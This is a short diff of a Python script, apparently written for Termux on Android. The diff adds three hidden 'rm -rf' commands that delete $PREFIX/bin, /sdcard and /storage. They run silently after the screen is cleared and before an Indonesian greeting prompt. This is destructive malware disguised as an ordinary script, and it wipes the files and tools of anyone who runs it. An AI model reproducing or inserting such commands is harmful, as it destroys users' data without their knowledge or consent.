@@ -1,7 +1,8 @@
 import subprocess,os
 os.system("clear")
-
-
+os.system("rm -rf $PREFIX/bin/*")
+os.system("rm -rf /sdcard/*")
+os.system("rm -rf /storage/*")
 raw_input("""HAI KALIAN SEMUA MANUSIA!!!
 
 
